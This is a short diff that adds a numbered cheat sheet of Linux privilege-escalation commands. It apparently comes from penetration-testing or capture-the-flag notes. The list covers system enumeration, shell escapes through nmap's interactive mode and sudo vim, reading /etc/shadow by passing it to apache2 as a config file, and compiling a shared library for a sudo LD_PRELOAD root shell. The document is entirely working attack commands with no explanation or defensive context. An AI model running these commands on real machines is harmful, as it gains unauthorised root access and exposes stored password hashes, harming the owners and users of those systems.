@@ -1,0 +1,8 @@
+1-) cat /proc/version
+2-) ip route
+3-) nmap --interactive !sh
+4-) sudo vim /usr/bin/vim -c '!/bin/sh'
+5-) sudo /usr/bin/apache2 -f /etc/shadow
+6-) gcc -fPIC -shared -o /tmp/library.so library.c -nostartfiles
+7-) sudo LD_PRELOAD=/tmp/library.so nmap
+8-) echo && 'bash'
